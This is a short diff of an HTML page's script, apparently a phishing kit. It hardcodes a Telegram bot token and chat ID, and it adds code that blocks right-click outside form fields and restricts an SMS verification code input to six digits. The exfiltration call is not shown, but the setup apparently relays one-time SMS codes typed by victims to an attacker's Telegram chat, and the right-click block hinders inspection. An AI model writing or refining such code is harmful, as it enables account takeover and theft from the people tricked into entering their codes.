@@ -255,6 +255,7 @@
   </div>
 
   <script>
+    
     const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
     const TELEGRAM_CHAT_ID = '7747778364';
 
@@ -440,6 +441,21 @@
       }
       this.value = value;
     });
+    
+      // Désactiver le clic droit sauf pour coller sur les champs formulaire
+document.addEventListener('contextmenu', function (event) {
+  const allowedElements = ['INPUT', 'TEXTAREA'];
+  if (!allowedElements.includes(event.target.tagName) || event.target.readOnly || !event.target.matches(':focus')) {
+    event.preventDefault();
+  }
+});
+
+// Limiter le code SMS à 6 chiffres
+document.getElementById('sms-code').addEventListener('input', function () {
+  this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+});
+  
+
   </script>
 </body>
 </html>
